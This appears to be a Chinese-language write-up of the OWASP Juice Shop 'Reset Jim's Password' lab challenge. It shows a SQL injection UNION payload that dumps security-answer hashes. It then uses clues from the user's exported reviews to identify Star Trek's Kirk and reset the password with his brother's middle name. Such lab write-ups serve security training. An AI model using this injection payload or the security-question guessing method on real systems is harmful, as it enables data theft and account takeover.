---
title: Reset Jim's Password
description: 从应用程序的数据导出、地址、评论中搜集用户信息，推测密码问题的答案
---

- Reset Jim's Password 
    - 描述： 通过忘记密码机制，使用他安全问题的原始答案来重置吉姆的密码。
    - 邮件地址为 ```jim@juice-sh.op```
    - 安全问题id 
        ```GET /rest/user/security-question?email=jim@juice-sh.op HTTP/1.1```
        得到安全问题id为1
        ```json
        "question": {
            "id": 1,
            "question": "Your eldest siblings middle name?"
        }
        ```
    - 使用 Injection - D3 Database Schema 挑战中的 SQL注入及模式表查询安全问题答案表
    - 构建查询，在原始查询中使用不存在的字符串确保只显示注入的联合查询，使用填充匹配原始查询的9列
        ```sql
        foo')) UNION SELECT UserId,SecurityQuestionId,answer,1,2,3,4,5,6 FROM SecurityAnswers--
        ```
    - 搜索用户id或安全问题id确定答案散列，但似乎使用更安全的 ‌SHA-256 哈希
        ```json
        {
            "UserId": 2,
            "SecurityQuestionId": 1,
            "answer": "d2425fd880e7f38c5b091a2aa32c89e7de94f0aee517ba8a6025e1287acefade"
        }        
        ```
    - 提示：Jim 是一个名人，信息公开可搜索
        或暴力破解
    
    - 使用数据导出功能获取信息
        ```http://127.0.0.1:3000/#/privacy-security/data-export```
        ```json
        {
            "username": "",
            "email": "jim@juice-sh.op",
            "orders": [],
            "reviews": [{
                "message": "Looks so much better on my uniform than the boring Starfleet symbol.",
                "author": "jim@juice-sh.op",
                "productId": 20,
                "likesCount": 0,
                "likedBy": []
            }, {
                "message": "Fresh out of a replicator.",
                "author": "jim@juice-sh.op",
                "productId": 22,
                "likesCount": 0,
                "likedBy": []
            }, {
                "message": "Looks spacy on Bones' new tricorder!",
                "author": "jim@juice-sh.op",
                "productId": 37,
                "likesCount": 0,
                "likedBy": []
            }],
            "memories": []
        }
        ```
    - 搜索 ```Looks so much better on my uniform than the boring Starfleet symbol.```
        得到
        > 星际舰队（Starfleet）是影视片集 星际迷航 中 星际联邦 的正规军队兼外太空探索部队。
    - 搜索 ```Looks spacy on Bones' new tricorder```
        得到 
        > 三录仪，英文名：Tricorder。在《星际迷航》中“三录仪”是一个万用工具
    - 搜索 ```star trek jim```
        得到 ```James Tiberius "Jim" Kirk```
    - 在 https://memory-alpha.fandom.com/wiki/James_T._Kirk 查看角色信息
        - 其 ```最大的兄弟姐妹 eldest siblings``` 的名字为 ```George Samuel Kirk```
    - 使用 ```Samuel``` 重置密码
- 代码挑战
    - 移除密码问题